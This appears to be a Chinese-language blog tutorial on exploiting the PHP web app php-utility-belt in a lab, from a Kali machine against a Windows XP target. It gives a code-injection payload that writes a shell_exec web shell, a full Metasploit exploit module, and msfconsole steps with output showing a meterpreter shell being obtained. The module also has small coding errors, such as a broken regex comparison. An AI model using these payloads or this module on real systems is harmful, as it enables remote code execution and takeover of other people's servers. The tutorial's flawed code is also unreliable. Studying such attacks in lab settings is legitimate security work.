# Metasploit渗透php-utility-belt程序

攻击机 kali 192.168.109.137

靶机：Win XP 192.168.109.141

应用程序 php-utility-belt (可以到链接：https://download.csdn.net/download/l1028386804/10923054 下载)

## 部署php-utility-belt

由于php-utility-belt是php程序，所以我们需要安装php环境,这里我为了简单直接安装了wamp环境。

将php-utility-belt解压后放在wamp的www目录下，

![img](https://img-blog.csdnimg.cn/20190117160010746.png)

同时在浏览器中访问链接：http://192.168.109.141/php-utility-belt/

如下图所示：

![img](https://img-blog.csdnimg.cn/20190117160027242.png)

显示这个页面就证明我们部署成功了。

## 构造并提交攻击脚本

我们文本框中输入如下代码：

```
fwrite(fopen('info.php','w'), '<?php $a = "net user"; echo shell_exec($a);?>');
```

并点击Run按钮

![img](https://img-blog.csdnimg.cn/20190117160107698.png)

## 查看php-utility-belt下的文件

此时，我们发现php-utility-belt下多了一个info.php文件

![img](https://img-blog.csdnimg.cn/20190117160129303.png)

我们查看这个文件的内容：

![img](https://img-blog.csdnimg.cn/20190117160142397.png)

## 访问info.php

我们在浏览器中输入：http://192.168.109.141/php-utility-belt/info.php 访问info.php。

![img](https://img-blog.csdnimg.cn/20190117160203928.png)

这里，会显示靶机上的所有用户，说明php-utility-belt存在漏洞。

## 进一步分析php-utility-belt的漏洞

在google或firefox浏览器按下F12键，通过对网页代码的分析，文本框中的数据是通过参数code进行post提交的。

![img](https://img-blog.csdnimg.cn/20190117160230265.png)

## 编写攻击脚本php_utility_belt_attack_by_binghe.rb

```
##
# Author 冰河
# Date 2019-01-17
# Description Metasploit渗透 php utility belt
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  include Msf:: Exploit::Remote::HttpClient
  
  def initialize(info = {})
    super(update_info(info,
      'Name'              => 'PHP Utility Belt Remote Code Execution',
      'Description'       => %q{
          This module exploits a remote code execution vulnerability in P
        },
       'Author'           =>
        [
          'binghe'
        ],
       
       'DisclosureDate'   => '2019-01-17',
       'Platform'         => 'php',
       'Payload'          =>
        {
          'Space'         => 2000,
          # 现在的漏洞在一个Web应用程序中，而不是在软件程序中，所以要将DisableNops的值设置为true以关闭攻击载荷中的NOP
          'DisableNops'   => true   
        },
       
       'Targets'          =>
        [
          ['PHP Utility Belt', {}]
        ],
       'DefaultTarget'   => 0))
    
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to PHP Utility Belt', '/php-utility-belt/ajax.php']),
        OptString.new('CHECKURI', [false, 'Checking Perpose', '/php-utility-belt/info.php']),
      ], self.class) 
    end
    
    def check
      send_request_cgi(
          'method'        => 'POST',
          'uri'           => normalize_uri(target_uri.path),
          'vars_post'     => {
              'code'      => "fwrite(fopen('info.php','w'), '<?php echo phpinfo();?>');"
            }
      )   
    resp = send_request_raw({'uri'  => normalize_uri(datastore['CHECKURI']), 'method' => 'GET'})
    if resp.body = ~/phpinfo()/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
   end
   
   def exploit
    send_request_cgi(
      'method'        => 'POST',
      'uri'           => normalize_uri(target_uri.path),
      'vars_post'     => {
        'code'        => payload.encoded
      }
    )
   end
   
end
```

## 上传攻击脚本php_utility_belt_attack_by_binghe.rb

将攻击脚本php_utility_belt_attack_by_binghe.rb上传的Kali的/usr/share/metasploit-framework/modules/exploits/web/php目录下。

## 运行攻击脚本php_utility_belt_attack_by_binghe.rb

```
msfconsole
use exploit/web/php/php_utility_belt_attack_by_binghe 
set payload php/meterpreter/bind_tcp
set RHOST 192.168.109.141
show options
exploit
sysinfo
```

具体操作效果如下：

```
msf > use exploit/web/php/php_utility_belt_attack_by_binghe 
msf exploit(web/php/php_utility_belt_attack_by_binghe) > set payload php/meterpreter/bind_tcp
payload => php/meterpreter/bind_tcp
msf exploit(web/php/php_utility_belt_attack_by_binghe) > set RHOST 192.168.109.141
RHOST => 192.168.109.141
msf exploit(web/php/php_utility_belt_attack_by_binghe) > show options

Module options (exploit/web/php/php_utility_belt_attack_by_binghe):

   Name       Current Setting             Required  Description
   ----       ---------------             --------  -----------
   CHECKURI   /php-utility-belt/info.php  no        Checking Perpose
   Proxies                                no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST      192.168.109.141             yes       The target address
   RPORT      80                          yes       The target port (TCP)
   SSL        false                       no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /php-utility-belt/ajax.php  yes       The path to PHP Utility Belt
   VHOST                                  no        HTTP server virtual host


Payload options (php/meterpreter/bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST  192.168.109.141  no        The target address


Exploit target:

   Id  Name
   --  ----
   0   PHP Utility Belt


msf exploit(web/php/php_utility_belt_attack_by_binghe) > exploit

[*] Started bind TCP handler against 192.168.109.141:4444
[*] Sending stage (38247 bytes) to 192.168.109.141

meterpreter > sysinfo
Computer    : LIUYAZHUANG
OS          : Windows NT LIUYAZHUANG 5.1 build 2600 (Windows XP Professional Service Pack 3) i586
Meterpreter : php/windows
meterpreter > 
```

到此，我们已经拿到了靶机的Shell，后续就可以进行各种渗透操作了。